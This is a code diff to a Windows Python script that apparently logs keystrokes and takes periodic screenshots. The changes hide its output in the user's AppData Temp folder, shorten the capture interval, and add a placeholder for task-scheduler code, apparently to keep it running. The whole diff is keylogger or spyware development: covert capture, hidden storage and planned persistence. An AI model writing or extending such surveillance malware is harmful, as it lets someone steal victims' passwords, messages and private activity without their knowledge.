@@ -15,7 +15,7 @@ import win32ui
 import uuid
 
 
-TIMEOUT = 15 #60*10
+TIMEOUT =  60*.25
 
 def get_dimensions():
     width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
@@ -48,7 +48,8 @@ def screenshot():
 
 
     path_beginning = os.path.dirname(os.path.realpath(__file__))
-    screenshot.SaveBitmapFile(mem_devicecontext, f'{path_beginning}/Screenshots/{name}.bmp')
+    #screenshot.SaveBitmapFile(mem_devicecontext, f'{path_beginning}\Screenshots\{name}.bmp')
+    screenshot.SaveBitmapFile(mem_devicecontext, f'C:\\Users\\Admin\\AppData\\Local\\Temp\\Screenshots\\{name}.bmp')
 
     mem_devicecontext.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
@@ -118,9 +119,13 @@ def run():
     
 
 if __name__ == '__main__':
-    path_beginning = os.path.dirname(os.path.realpath(__file__))
-    keystroke_path = path_beginning + "/keystrokes_out.txt"
-    Screenshot_Directory = path_beginning + "/Screenshots"
+    #path_beginning = os.path.dirname(os.path.realpath(__file__))
+    #keystroke_path = path_beginning + "/keystrokes_out.txt"
+    keystroke_path = "C:\\Users\\Admin\\AppData\\Local\\Temp\\keystrokes_out.txt"
+    #Screenshot_Directory = path_beginning + "/Screenshots"
+    Screenshot_Directory = "C:\\Users\\Admin\\AppData\\Local\\Temp\\Screenshots"
+    
+    # <insert the task scheduler code here> **grab from github**
 
     if not os.path.exists(Screenshot_Directory):
         os.mkdir(Screenshot_Directory)
@@ -133,7 +138,4 @@ if __name__ == '__main__':
             f.write(run())
 
 
-
-
-    #print(run())
-    print('\ndone')
+    
